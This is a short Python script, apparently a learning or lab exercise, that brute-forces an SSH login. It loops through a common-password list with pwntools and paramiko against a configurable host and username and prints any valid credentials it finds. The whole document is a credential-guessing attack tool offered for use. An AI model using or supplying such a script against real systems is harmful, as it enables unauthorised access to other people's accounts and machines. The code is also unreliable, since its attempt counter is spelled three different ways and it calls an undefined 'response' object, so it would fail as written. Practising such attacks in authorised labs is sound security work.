from pwn import *
import paramiko

host = "127.0.0.1" # CHANGE THIS
username = "notroot" # CHANGE THIS
attmepts = 0

with open("ssh-common-passwords.txt", "r") as passfile:
    for password in passfile:
        password = password.strip("\n")
        try:
            print(f"[{attmempt}] Attempting Password: {password}")
            resp = ssh(host=host, user=username, password=password, timeout=1)
            if resp.connected():
                print(f"[>] Valid Credentials Found! {username}:{password}")
                resp.close()
                exit(0)
            response.close()
        except paramiko.ssh_exception.AuthenticationException:
            print("[X] Invalid Password...:")
        attempts += 1
